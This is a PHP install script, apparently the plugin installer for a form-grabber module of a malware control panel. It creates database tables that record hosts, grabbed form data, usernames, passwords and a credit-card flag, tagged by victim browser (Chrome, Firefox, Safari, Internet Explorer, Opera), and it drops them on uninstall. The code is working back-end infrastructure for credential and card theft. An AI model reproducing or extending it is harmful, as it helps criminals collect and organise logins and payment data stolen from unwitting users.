<?php

class de_install
{
    private $MySQL;
    private $PluginName;

    public function __construct()
    {
        include('info.php');

        $this->MySQL = new MySQL(HOST, USER, PASS, DB);
        $this->PluginName = str_replace(' ', '', trim(strtolower($PLUGIN_NAME)));
    }

    public function install()
    {
        $this->MySQL->doQuery('CREATE TABLE `plugin_' . $this->PluginName . '` (
                                `ID` INT NOT NULL AUTO_INCREMENT PRIMARY KEY ,
                                `GUID` BINARY(16) NOT NULL ,
                                `host` VARCHAR( 300 ) NOT NULL ,
                                `data` text NOT NULL,
								`username` VARCHAR( 100 ) NOT NULL ,
                                `password` VARCHAR( 100 ) NOT NULL ,
								`creditcard` BOOLEAN NOT NULL DEFAULT \'0\',
								`creationDate` datetime NOT NULL,
                                `fkGrabTypeId` tinyint NOT NULL,
                                `hash` BINARY(16) NOT NULL ,
                                UNIQUE KEY `data_unique` (`hash`)
                                ) ENGINE = MYISAM CHARACTER SET ucs2;
							');

        $this->MySQL->doQuery('CREATE TABLE IF NOT EXISTS `plugin_formgrabber_type` (
                                `typeId` tinyint NOT NULL PRIMARY KEY ,
                                `typename` VARCHAR( 255 ) NOT NULL 
                                ) ENGINE = MYISAM CHARACTER SET utf8 COLLATE utf8_unicode_ci;
							');

        $this->MySQL->doQuery('INSERT INTO `plugin_formgrabber_type` (`typeId`, `typename`) VALUES (1,  \'Google Chrome\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_formgrabber_type` (`typeId`, `typename`) VALUES (2,  \'Mozilla Firefox\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_formgrabber_type` (`typeId`, `typename`) VALUES (3,  \'Apple Safari\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_formgrabber_type` (`typeId`, `typename`) VALUES (4,  \'Internet Explorer\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_formgrabber_type` (`typeId`, `typename`) VALUES (5,  \'Opera\')');

    }

    public function deinstall()
    {
        $this->MySQL->doQuery('DROP TABLE `plugin_' . $this->PluginName . '`');
        $this->MySQL->doQuery('DROP TABLE `plugin_formgrabber_type`');
    }
}